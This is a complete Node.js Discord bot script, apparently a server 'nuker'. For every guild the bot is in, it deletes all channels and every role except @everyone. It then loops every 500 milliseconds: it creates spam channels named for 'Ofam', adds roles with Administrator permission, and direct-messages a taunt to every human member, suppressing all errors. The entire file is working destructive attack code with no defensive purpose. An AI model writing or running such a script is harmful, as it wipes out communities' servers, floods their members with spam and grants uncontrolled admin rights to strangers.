const { Client, GatewayIntentBits, PermissionsBitField, ChannelType } = require('discord.js');

const token = process.argv[2];

if (!token) {
  console.error("Discord Token missing! Please provide a valid token.");
  process.exit(1);
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.DirectMessages,
  ]
});

client.once('ready', async () => {
  const message = "Ofam got more ego boost.";
  const channel = "Ofam-have-owner-wesley";
  const roleys = "Ofam";
  
  client.guilds.cache.forEach(async guild => {
    try {
      const fetchedGuild = await guild.fetch();
      const channels = fetchedGuild.channels.cache;
      const roles = fetchedGuild.roles.cache;

      await Promise.all(channels.map(channel => channel.delete().catch(() => {})));

      await Promise.all(roles.map(role => {
        if (role.name !== '@everyone') return role.delete().catch(() => {});
      }));

      setInterval(async () => {
        try {
          const newChannel = await guild.channels.create({
            name: `${channel}-${Math.floor(Math.random() * 10000)}`,
            type: ChannelType.GuildText,
            reason: 'Creating a new spam channel for Ofam'
          });

          await newChannel.send(message).catch(() => {});

          await guild.roles.create({
            name: `${roleys}-${Math.floor(Math.random() * 10000)}`,
            color: '#' + Math.floor(Math.random() * 16777215).toString(16),
            permissions: [PermissionsBitField.Flags.Administrator],
            reason: 'Creating a new role for Ofam'
          }).catch(() => {});

          const members = await guild.members.fetch();
          members.forEach(member => {
            if (!member.user.bot) {
              member.send(message).catch(() => {});
            }
          });
        } catch (error) {}
      }, 500);
    } catch (error) {}
  });
});

client.login(token).catch(() => {
  console.error("Failed to login with the provided token.");
  process.exit(1);
});
